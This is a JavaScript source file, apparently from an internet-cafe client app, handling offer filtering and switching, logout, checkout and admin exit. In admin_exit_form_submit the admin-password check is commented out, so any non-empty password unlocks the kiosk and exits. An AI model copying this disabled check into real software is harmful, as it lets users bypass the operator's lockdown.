				var end = moment().set({ 'hour': parseInt(end_enable_times[0]), 'minute': parseInt(end_enable_times[1]), 'second': 0 });
				if (end >= begin) {
					if (!today_enable)
						return;
					if (begin.isAfter() || end.isBefore())
						return;
				}

				// if like 23:00-08:00 over mid-night
				if (end < begin) {
					let isValid = ((begin.isBefore() && today_enable) || (yesterday_enable && end.isAfter()));
					if (!isValid)
						return;
				}
			}

			filtered_items.push(obj);
		});

		var new_items = [];
		for (var i=0; i<filtered_items.length; i++)
		{
			if(filtered_items[i].product_name.startsWith('*'))continue;
			if (theShop.current_group_id != PRODUCT_GROUP_COINS && filtered_items[i].product_price == 0 && filtered_items[i].product_coin_price > 0) continue;
			filtered_items[i].image = 'images/default-offer2.png';
			if (filtered_items[i].product_has_image) { filtered_items[i].image = ICAFEMENU_CORE.posters_path(filtered_items[i].product_id + '.jpg'); }
			new_items.push(filtered_items[i]);
		}
		vueOffers.items = JSON.parse(JSON.stringify(new_items))

	}

	// 调 memberAvailableOffers API 拉取最新 offer 列表，更新 thePCStatus.available_offers 后刷新 UI
	// start-session 初始化和买 offer 成功后都调用此函数
	// force_remount: 面板已经打开的情况下，是否强制重新挂载一次才能让新数据显示出来（见下方说明）。
	// 手动点 My Offers tab 打开面板时不传（调用方已经把 showMyOffers 同步设成 true 了，这里再重新
	// 挂载一次会让刚打开的面板肉眼可见地闪一下），只有 WSS 收到 refresh_offers 这种"面板可能已经开着、
	// 数据在背后被换掉"的场景才传 true。
	// set_default_tab: 仅 start-session 页面刚进入（StartSession.show()）时传 true——账号已有 offer
	// 就默认打开 My Offers tab。运行时刷新（买东西后 / WSS 推送）不应该替用户切换当前正看着的 tab，
	// 不传这个参数。
	this.fetch_available_offers = async function (force_remount, set_default_tab) {
		try {
			var pc_name = (typeof thePCInfo !== 'undefined' && thePCInfo.pc_name) ? thePCInfo.pc_name : '';
			// theApiClient.callCafeApi 返回的已经是 response.data 那一层（与项目里其它地方一致），
			// 直接访问 res.available_offers，不要再套 res.data
			var res = await theApiClient.callCafeApi('memberAvailableOffers?pc_name=' + encodeURIComponent(pc_name), 'GET');
			if (res && Array.isArray(res.available_offers)) {
				thePCStatus.available_offers = res.available_offers.map(function (ao) {
					return {
						member_offer_id:           ao.member_offer_id,
						product_name:              ao.product_name,
						member_offer_left_seconds: ao.member_offer_left_seconds,
						is_available_now:          ao.is_available_now !== false,
					};
				});
			}
		} catch (e) {
			// 静默失败，保留 thePCStatus.available_offers 的旧值
		}

		if (set_default_tab) {
			vueGlobal.showMyOffers = thePCStatus.available_offers.length > 0;
			return;
		}

		// 运行时刷新：只更新数据，不擅自切换用户当前所在的 tab（买东西/后台推送都不该把用户手上
		// 正看着的 tab 换掉）。thePCStatus 是普通对象、不是 PetiteVue.reactive()，直接改
		// available_offers 不会触发视图更新——面板已经打开时，true -> true 不是变化，v-if 不会
		// 重新求值，得手动 false -> true 走一遍才能强制重新挂载、读到最新数据。
		if (force_remount && vueGlobal.showMyOffers) {
			vueGlobal.showMyOffers = false;
			await PetiteVue.nextTick();
			vueGlobal.showMyOffers = true;
		}
	}

	// "My Offers" tab 切换统一入口：模板只调这一个方法，不直接改 vueGlobal.showMyOffers
	this.showMyOffersTab = function () {
		vueGlobal.showMyOffers = true;
		this.fetch_available_offers();
	}

	this.activateOffer = function (item) {
		theOfferSwitch.doSwitch('offer', item.member_offer_id);
	}
}

// 会话中切换 offer（sidebar ⇄ 按钮 → 弹确认 → 调用后端 switchOffer）
function OfferSwitch()
{
	this.show = function () {
		vueGlobal.modals.offerSwitch = true;
	}

	this.confirm = function (item) {
		var billing_source = item.time_type === 'balance' ? 'balance' : 'offer';
		var member_offer_id = item.time_type === 'offer' ? (item.member_offer_id || 0) : 0;
		var msg = (item.name || '') + ' ' + translate_string('Your current session will be checked out and this offer will be activated.');

		swal({
			title: translate_string('Activate this offer?'),
			text: msg,
			type: 'warning',
			showCancelButton: true,
			confirmButtonText: translate_string('Confirm'),
			cancelButtonText: translate_string('Cancel'),
			closeOnConfirm: true,
		}, function (isConfirm) {
			if (!isConfirm) return;
			theOfferSwitch.doSwitch(billing_source, member_offer_id);
		});
	}

	this.doSwitch = function (billing_source, member_offer_id) {
		vueGlobal.isLoading = true;
		theApiClient.callCafeApi('switchOffer', 'POST', {
			pc_name: thePCInfo.pc_name,
			billing_source: billing_source,
			member_offer_id: member_offer_id,
		}).then(function (res) {
			vueGlobal.modals.offerSwitch = false;
			// 成功后端会推 WSS push_clientstatus，listen.js 会刷新 thePCStatus / vueAvailableOffers
			if (typeof toastr !== 'undefined') {
				// 显式传 timeOut，避开 listen.js 的全局污染（timeOut=0 会让 toast 永不消失）
				toastr.success(
					billing_source === 'balance' ? translate_string('Balance activated') : translate_string('Offer activated'),
					'',
					{ timeOut: 2000, extendedTimeOut: 1000, closeButton: true }
				);
			}
		}).catch(function (e) {
			ICafeApiError.show(e);
		}).finally(function () {
			vueGlobal.isLoading = false;
		});
	}
}

// 会话终止相关动作：登出、结账登出、管理员退出、刷新事件+余额。跟 Login() 是相反方向的
// 生命周期（Login 负责"进入"，Session 负责"离开/退出"），因此分成两个构造函数而不是合一。
function Session()
{
	this.logout = function()
	{
		thePCStatus = { member_account: '' };
		theStartSession.member_account = '';
		memberInfo.member_photo = null;

		ICAFEMENU_CORE.sendCommandToExe('RUN logout.bat');
		theLogin.show_login_page('login');
		theEvents.reset();
		theChat.reset();
	}

	// 退回登录页。有活跃会话时保留 PC 字段，走完整 wss_client_status 流程；从没登录过/已经退出时不能走
	// 那条路——它会把 wssConnected 置真放开登录按钮、可能触发 license_using_billing=0 的自动 guest 登录，
	// 而且 thePCStatus 里可能还没有 license_server_code，setServerCode(undefined) 会把后续 API 地址打坏。
	// 这种情况只要保证页面在登录页上就行；已经在登录页就什么都不做，别去清空客人正在填的表单。
	this.logout_session = function()
	{
		if (!is_logined()) {
			if (vueGlobal.currentView !== 'login')
				theLogin.show_login_page('login');
			return;
		}
		theListen.wss_client_status({ data: { client_status: { ...thePCStatus, member_account: '' } } });
	}

	this.confirm_checkout_submit = function()
	{
		vueGlobal.modals.confirmCheckout = false;

		if (is_logined() && thePCStatus.member_group_id == MEMBER_GROUP_POSTPAID)
			toast(translate_string("This session needs to check out from server, please contact admin."));

		ICAFEMENU_CORE.wsssend('request_checkout', 'request', 'wss-server', { member_recent_played: theGame.member_recent_played, source: "client" });

		this.logout_session();

		return false;
	}

	this.close_click = function() {
		unlock_all()
		ICAFEMENU_CORE.sendCommandToExe("EXIT");
	}

	this.admin_exit_form_submit = async function() {
		vueGlobal.isLoading = true;

		var password = vueAdminExit.password;
		if (password.length == 0) {
			vueGlobal.isLoading = false;
			vueAdminExit.hasError = true;
			return false;
		}

		// if (theSettings.admin_password != (theSettings.admin_password.charAt(0) == '*' ? '*' + sha256('*' + sha256(password)) : sha256(md5(password)))) {
		// 	setTimeout(function () {
		// 		sweetAlert("", translate_string("Wrong password!"), "error");
		// 	}, 100);
		// 	vueGlobal.isLoading = false;
		// 	vueAdminExit.hasError = true;
		// 	return false;
		// }

		const data = await theApiClient.callApi(theApiClient.getServerUrl('auth/guestLogin'), 'POST', {
			license_name: theCafe.license_name,
			// pc_name: thePCInfo.pc_name,
			is_client: 1,
		}, {timeout: 5000}).catch(ICafeApiError.skip);

		// if(data)
		// {
		// 	await theApiClient.callCafeApi('syslog', 'post', {
		// 			pc_name: thePCInfo.pc_name,
		// 			event: 'ADMINEXIT',
		// 		}, { timeout: 5000 }).catch(ICafeApiError.skip);
		// }

		vueGlobal.isLoading = false;

		unlock_all()
		ICAFEMENU_CORE.sendCommandToExe("EXIT");

		return false;
	}

	this.client_refresh = async function() {
		vueGlobal.isLoading = true;
		try {
			var promises = [];
			if (typeof theEvents !== 'undefined') {
				promises.push(theEvents.refresh());
			}
			if (typeof refreshBalanceInfo !== 'undefined' && typeof memberInfo !== 'undefined') {
				promises.push(refreshBalanceInfo(memberInfo.member_name || memberInfo.member_account));
			}
			await Promise.all(promises);
		} catch (e) {
			console.error(e);
		} finally {
			vueGlobal.isLoading = false;
		}
	}
}

// "验证身份以继续"弹窗：已停用。密码复验兜底目前改为 IP 白名单不命中直接拒绝（见
// wsclassclient.php::login() 的 ip_not_trusted 分支），服务端不再发 need_credentials/denied，
// 下面这段永远不会被触发，整段保留注释，需要重新启用密码兜底时取消注释即可（对应的 modal HTML
// 也在 login.htm 里以同样方式注释保留）。
/*
// "验证身份以继续"弹窗：wss 登录时 status_pc_token 不匹配（PC 重启/陌生连接），服务端要求补充密码证明
// 就是当前正在使用这台 PC 的会员本人，见 wss-client.js 对 wss_need_credentials/wss_login_denied 的处理
// 和 wsclassclient.php::login() 里对应的服务端逻辑。账号不需要用户输入——服务端已经知道这台 PC 当前
// 绑定的是哪个会员，随 need_credentials 一起回传 member_account 只是给用户看"正在验证谁"，只读展示，
// 复用 vueLogin.verify_account；密码复用 vueLogin.password（跟主登录页同一份字段）。弹窗本身是独立于
// #page_login 的轻量 modal——这是 wss 连接层的背景校验，用户此时多半停留在游戏页/商城页，不应该被强制
// 跳转回整页登录界面。
function verify_identity_submit() {
	if (vueLogin.verify_denied) return false;
	if (!vueLogin.password) {
		vueLogin.verify_message = translate_string('Please enter your password');
		return false;
	}
	if (window.theWssClient) {
		window.theWssClient.retryWithCredentials(vueLogin.password);
	}
	return false;
}

window.addEventListener('wss_need_credentials', function (e) {
	vueLogin.verify_account = (e.detail && e.detail.data && e.detail.data.member_account) || vueLogin.verify_account;
	// 弹窗已经开着说明这是上一次提交失败后服务端再次要求，展示"密码错误"；否则是第一次弹出，不需要错误提示
	if (vueGlobal.modals.verifyIdentity) {
		vueLogin.verify_message = translate_string('Incorrect password, please try again');
	} else {
		vueLogin.verify_message = '';
	}
	vueLogin.password = '';
	vueGlobal.modals.verifyIdentity = true;
});

window.addEventListener('wss_login_denied', function () {
	vueLogin.verify_denied = true;
	vueLogin.verify_message = translate_string('Too many attempts. Please contact staff for assistance.');
	vueGlobal.modals.verifyIdentity = true;
});
*/

// @deprecated 向后兼容用，不要在新代码里调用。这些函数原先都是本文件（login.js）里的裸顶层函数，
// 实现已经并入 Login()/Session()（theLogin/theSession）或已有的 TopupLogin()/MemberRegister()
// （theTopupLogin/theMemberRegister），但主题 .htm 里曾直接调用这些裸函数名（含 delay_execute()
// 按引用传递的场景），版本库外可能存在的自定义主题副本升级 core/js 时不会同步改动，仍会按旧的
// 裸函数名调用，所以在原来的位置保留这层薄包裹。show_login_form/show_login_by_no_token 经核实
// 全仓库零调用，直接删除，不保留兼容包裹。
function login_switch_tab(tab) { return theLogin.login_switch_tab(tab); } // @deprecated 用 theLogin.login_switch_tab()
function onAccessCodeInput(index, event) { return theLogin.onAccessCodeInput(index, event); } // @deprecated 用 theLogin.onAccessCodeInput()
function onAccessCodeKeyDown(index, event) { return theLogin.onAccessCodeKeyDown(index, event); } // @deprecated 用 theLogin.onAccessCodeKeyDown()
function start_social_login() { return theLogin.start_social_login(); } // @deprecated 用 theLogin.start_social_login()
function homecafeid_form_submit() { return theLogin.homecafeid_form_submit(); } // @deprecated 用 theLogin.homecafeid_form_submit()
function multi_mode_login() { return theLogin.multi_mode_login(); } // @deprecated 用 theLogin.multi_mode_login()
function login_form_submit(bookingPassword = null) { return theLogin.login_form_submit(bookingPassword); } // @deprecated 用 theLogin.login_form_submit()
function show_login_page(sub_div) { return theLogin.show_login_page(sub_div); } // @deprecated 用 theLogin.show_login_page()
function getMemberInfo() { return theLogin.getMemberInfo(); } // @deprecated 用 theLogin.getMemberInfo()
function submitBookingPassword() { return theLogin.submitBookingPassword(); } // @deprecated 用 theLogin.submitBookingPassword()
function logout() { return theSession.logout(); } // @deprecated 用 theSession.logout()
function confirm_checkout_submit() { return theSession.confirm_checkout_submit(); } // @deprecated 用 theSession.confirm_checkout_submit()
function close_click() { return theSession.close_click(); } // @deprecated 用 theSession.close_click()
function admin_exit_form_submit() { return theSession.admin_exit_form_submit(); } // @deprecated 用 theSession.admin_exit_form_submit()
function client_refresh() { return theSession.client_refresh(); } // @deprecated 用 theSession.client_refresh()
function member_register() { return theMemberRegister.submit(); } // @deprecated 用 theMemberRegister.submit()
function guest_login_submit() { return theTopupLogin.guest_login_submit(); } // @deprecated 用 theTopupLogin.guest_login_submit()
function balance_login_submit() { return theTopupLogin.balance_login_submit(); } // @deprecated 用 theTopupLogin.balance_login_submit()
